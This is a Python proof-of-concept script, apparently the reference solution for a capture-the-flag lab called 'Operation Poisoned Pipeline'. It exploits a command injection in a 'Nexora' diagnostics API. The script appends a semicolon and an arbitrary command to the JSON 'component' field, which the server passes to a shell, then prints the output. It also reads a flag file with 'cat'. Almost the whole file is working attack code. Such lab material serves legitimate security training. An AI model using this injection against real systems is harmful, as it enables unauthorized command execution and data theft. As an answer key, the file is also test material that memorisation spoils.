#!/usr/bin/env python3
"""
S04 - Poisoned Runtime
Reference Proof-of-Concept for the Nexora diagnostics command injection.

Authorized use only inside the isolated Operation Poisoned Pipeline lab.

This PoC uses only the Python standard library so it can be run from
any minimal Python image without pip install and without Internet access.
"""

import argparse
import json
import sys
import urllib.error
import urllib.request


DEFAULT_TARGET = "http://nexora-app:5000"
DIAGNOSTICS_PATH = "/api/diagnostics/run"
DEFAULT_FLAG_PATH = "/opt/nexora/private/s04_flag.txt"


def post_json(url, payload, timeout=20):
    data = json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        status = response.status
        body = response.read().decode("utf-8")
    return status, json.loads(body)


def run_command(target, command, timeout=20):
    url = target.rstrip("/") + DIAGNOSTICS_PATH

    # The server calls:
    #   /opt/nexora/bin/verify-component <component>
    # with shell=True and the component value inserted verbatim.
    # The semicolon terminates the helper invocation and starts the
    # attacker-controlled command in the same shell.
    payload = {
        "component": "nexora-utils; " + command,
        "verbose": True,
    }

    print(f"[+] POST {url}")
    print(f"[+] Injected command: {command}")

    try:
        status, body = post_json(url, payload, timeout=timeout)
    except urllib.error.HTTPError as exc:
        print(f"[ERROR] HTTP error: {exc.code} {exc.reason}")
        sys.exit(1)
    except urllib.error.URLError as exc:
        print(f"[ERROR] Connection failed: {exc.reason}")
        print(f"        Target: {url}")
        print("        Ensure the application container is running")
        print("        and reachable on the current Docker network.")
        sys.exit(1)

    print(f"[+] HTTP status: {status}")

    stdout = body.get("stdout", "")
    stderr = body.get("stderr", "")

    if stdout:
        print("[+] Server stdout:")
        for line in stdout.rstrip().splitlines():
            print(f"    {line}")

    if stderr:
        print("[+] Server stderr:")
        for line in stderr.rstrip().splitlines():
            print(f"    {line}")

    return body


def main():
    parser = argparse.ArgumentParser(
        description="S04 - Poisoned Runtime reference PoC"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Base URL (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--command",
        default="id",
        help="Command to run as pipeline-app (default: id)",
    )
    parser.add_argument(
        "--read-flag",
        action="store_true",
        help="Run the intended flag-reading path",
    )
    parser.add_argument(
        "--flag-path",
        default=DEFAULT_FLAG_PATH,
        help=f"Flag path inside the container (default: {DEFAULT_FLAG_PATH})",
    )
    args = parser.parse_args()

    print("==============================================")
    print(" S04 - Poisoned Runtime Reference PoC")
    print("==============================================")
    print()

    if args.read_flag:
        command = f"cat {args.flag_path}"
    else:
        command = args.command

    result = run_command(args.target, command)

    rc = result.get("return_code")
    if rc == 0:
        print()
        print("[+] Command completed (return_code=0).")
    else:
        print()
        print(f"[!] Command returned non-zero: {rc}")


if __name__ == "__main__":
    main()